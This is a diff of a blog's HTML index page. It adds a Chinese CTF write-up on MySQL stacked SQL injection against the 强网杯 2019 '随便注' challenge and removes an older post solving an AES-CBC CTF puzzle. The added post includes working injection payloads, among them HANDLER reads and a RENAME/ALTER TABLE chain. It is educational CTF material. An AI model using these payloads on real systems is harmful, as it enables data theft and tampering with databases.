@@ -152,6 +152,108 @@
     
     
     <article
+  id="post-堆叠注入"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"
+    >堆叠注入</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2023-02-02T08:53:04.000Z" itemprop="datePublished">2023-02-02</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL可以执行多条语句，多条语句之前用;做分隔。 简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法 执行其他恶意语句，如RENAME、DROP等，堆叠注入可以用于执行任何SQL语句。 </span><br><span class="line">并不是所有情况下都可以使用堆叠注入</span><br><span class="line">需要满足条件$mysqli-&gt;multi_query($sql);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返 回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用RENAME关键 字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名</span><br></pre></td></tr></table></figure>
+
+<h3 id="当select被过滤了用handler来绕过"><a href="#当select被过滤了用handler来绕过" class="headerlink" title="当select被过滤了用handler来绕过"></a>当select被过滤了用handler来绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一 行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是</span><br><span class="line">mysql专用的语句，并没有包含到SQL标准中。</span><br><span class="line">条件：堆叠注入</span><br><span class="line">handler users open as hd; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler hd read first; #读取指定表/句柄的首行数据 </span><br><span class="line">handler hd read next; #读取指定表/句柄的下一行数据</span><br><span class="line">handler hd close; #关闭句柄</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[强网杯 2019]随便注</p>
+<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190616986.png" alt="1662190616986"></p>
+<p>输入  1’</p>
+<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190675022.png" alt="1662190675022"></p>
+<p>报错说明存在sql注入漏洞</p>
+<p>输入   1’ order by 3#时</p>
+<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190776274.png" alt="1662190776274"></p>
+<p>说明select语句里有两个字段</p>
+<p>然后尝试用联合注入获取数据库名</p>
+<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190923197.png" alt="1662190923197"></p>
+<p>发现select被过滤了然后用堆叠注入的方法获得表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191211421.png" alt="1662191211421"></p>
+<p>得到两个表 然后分别查询两个表中的字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191442844.png" alt="1662191442844"></p>
+<p>这里发现有个 flag</p>
+<p>第一种方法：</p>
+<p>所以只需   select flag from <code>1919810931114514</code>;#   但是select被过滤了所以要用handler1</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first#</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191646739.png" alt="1662191646739"></p>
+<p>第二种方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `words`;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662206518828.png" alt="1662206518828"></p>
+<p>发现了   id    data   这两个字段</p>
+<p>可以</p>
+<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
+<p>2，把 1919810931114514 表的名字改为 words 。</p>
+<p>3 ，把flag改为id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words2`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#</span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662208984049.png" alt="1662208984049"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" rel="tag">堆叠注入</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
   id="post-union联合注入"
   class="article article-type-post"
   itemscope
@@ -1205,71 +1307,6 @@
     <footer class="article-footer">
        
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li></ul>
-
-    </footer>
-  </div>
-
-   
-   
-  
-</article>
-
-    
-    <article
-  id="post-AES"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2023/01/15/AES/"
-    >AES</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2023/01/15/AES/" class="article-date">
-  <time datetime="2023-01-15T03:19:52.000Z" itemprop="datePublished">2023-01-15</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/crypto/">crypto</a> / <a class="article-category-link" href="/categories/crypto/AES/">AES</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>直接通过题目来学习</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> <span class="keyword">import</span> binascii</span><br><span class="line"> <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"> <span class="keyword">from</span> aes_flag <span class="keyword">import</span> flag,key</span><br><span class="line"> <span class="keyword">import</span> os</span><br><span class="line"> <span class="comment">#maybe flag is fake</span></span><br><span class="line"> iv = flag</span><br><span class="line"> l = <span class="built_in">len</span>(key)</span><br><span class="line"> <span class="keyword">if</span> l==<span class="number">16</span>:</span><br><span class="line"></span><br><span class="line">     hint = os.urandom(<span class="number">4</span>) * <span class="number">16</span></span><br><span class="line">     <span class="built_in">print</span>(bytes_to_long(hint)^bytes_to_long(key))</span><br><span class="line"></span><br><span class="line">     msg = <span class="string">b&#x27;Welcome! Good luck have fun! diyicichutiqiuqingpen xiexiele.....&#x27;</span></span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">encrypto</span>(<span class="params">message</span>):</span><br><span class="line">         aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">         <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line">     <span class="built_in">print</span>(binascii.hexlify(encrypto(msg))[-<span class="number">32</span>:])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10814139970454569101142970101299943513649261825483864773663646850498898172963892837254881797558641977330505910327448279013601791760702391621769017335029566</span></span><br><span class="line"><span class="string">b&#x27;a99b50f2320e2768e94535cac2888a96&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>分析</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> l = <span class="built_in">len</span>(key)</span><br><span class="line"> <span class="keyword">if</span> l==<span class="number">16</span>:</span><br><span class="line">     hint = os.urandom(<span class="number">4</span>) * <span class="number">16</span></span><br><span class="line">     <span class="built_in">print</span>(bytes_to_long(hint)^bytes_to_long(key))</span><br><span class="line"><span class="comment">#key是16个字节 而hint是16个重复的4个字节</span></span><br><span class="line"><span class="comment">#所以hint 可以通过异或之后前面的字节求出</span></span><br><span class="line"><span class="comment">#key通过异或求出</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -----------get key---------</span></span><br><span class="line">tmp = <span class="number">10814139970454569101142970101299943513649261825483864773663646850498898172963892837254881797558641977330505910327448279013601791760702391621769017335029566</span></span><br><span class="line">hint = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(tmp))[<span class="number">2</span>:<span class="number">10</span>] * <span class="number">16</span>,<span class="number">16</span>)</span><br><span class="line">key = long_to_bytes(tmp ^ hint)</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> binascii, sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------get key---------</span></span><br><span class="line">tmp = <span class="number">10814139970454569101142970101299943513649261825483864773663646850498898172963892837254881797558641977330505910327448279013601791760702391621769017335029566</span></span><br><span class="line">hint = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(tmp))[<span class="number">2</span>:<span class="number">10</span>] * <span class="number">16</span>,<span class="number">16</span>)</span><br><span class="line">key = long_to_bytes(tmp ^ hint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------get iv-----------</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome! Good luck have fun! diyicichutiqiuqingpen xiexiele.....&#x27;</span></span><br><span class="line">msgs = [msg[ii:(ii+<span class="number">16</span>)] <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(msg),<span class="number">16</span>)]</span><br><span class="line">msgs.reverse()</span><br><span class="line">IV = binascii.unhexlify(<span class="string">&#x27;a99b50f2320e2768e94535cac2888a96&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decry</span>(<span class="params">key,IV,ms</span>):</span><br><span class="line">    aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> strxor(aes.decrypt(IV),ms)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ms <span class="keyword">in</span> msgs:</span><br><span class="line">    IV=decry(key,IV,ms)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span> + IV+ <span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AES/" rel="tag">AES</a></li></ul>
 
     </footer>
   </div>
